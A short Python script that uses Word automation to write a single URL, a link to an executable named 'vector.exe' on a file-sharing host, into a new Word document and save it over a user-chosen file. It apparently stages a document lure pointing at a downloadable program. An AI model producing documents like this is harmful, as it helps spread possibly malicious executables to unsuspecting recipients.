import win32com.client
from tkinter import Tk
from tkinter.filedialog import askopenfilename

root = Tk()
root.withdraw()

url = "https://filebin.sourcepaint.cz/lnoeqkeu6xm4t056/vector.exe"

word_path = askopenfilename(title="Select Word File", filetypes=[("DOCX", "*.docx")])
if not word_path:
    print("No Word file selected. Exiting.")
    exit()

word = win32com.client.Dispatch("Word.Application")
word.Visible = False

doc = word.Documents.Add()

doc.Content.Text = url

doc.SaveAs(word_path)

doc.Close()
word.Quit()

print(f"URL successfully added to the Word document: {url}")
